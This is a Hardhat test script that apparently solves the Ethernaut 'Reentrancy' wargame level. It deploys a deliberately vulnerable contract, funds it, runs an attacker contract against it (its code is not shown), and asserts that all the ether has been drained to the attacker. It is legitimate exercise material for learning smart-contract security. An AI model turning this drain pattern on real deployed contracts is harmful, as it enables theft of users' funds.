import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut 10 - Reentrancy", function () {
  it("Should drain all Ether from Reentrance contract", async function () {
    const [deployer, attacker] = await ethers.getSigners();

    // Deploy vulnerable contract and fund it
    const ReentranceFactory = await ethers.getContractFactory("Reentrance");
    const reentrance = await ReentranceFactory.deploy();
    await reentrance.waitForDeployment();

    // Fund the vulnerable contract with 5 ether from deployer
    await deployer.sendTransaction({
      to: reentrance.target as string,
      value: ethers.parseEther("5.0")
    });

    // Deploy attacker contract
    const ReentranceAttackFactory = await ethers.getContractFactory("ReentranceAttack");
    const attackContract = await ReentranceAttackFactory.connect(attacker).deploy(reentrance.target as string);
    await attackContract.waitForDeployment();

    // Start the attack with 1 ether
    await attackContract.connect(attacker).attack({ value: ethers.parseEther("1.0") });

    // Drain is complete, withdraw to attacker wallet
    await attackContract.connect(attacker).withdraw();

    const finalVictimBalance = await ethers.provider.getBalance(reentrance.target as string);
    const attackerBalance = await ethers.provider.getBalance(attacker.address);

    expect(finalVictimBalance).to.equal(0n);
    expect(attackerBalance).to.be.gt(ethers.parseEther("5.5")); // Allow for gas cost wiggle room
  });
});
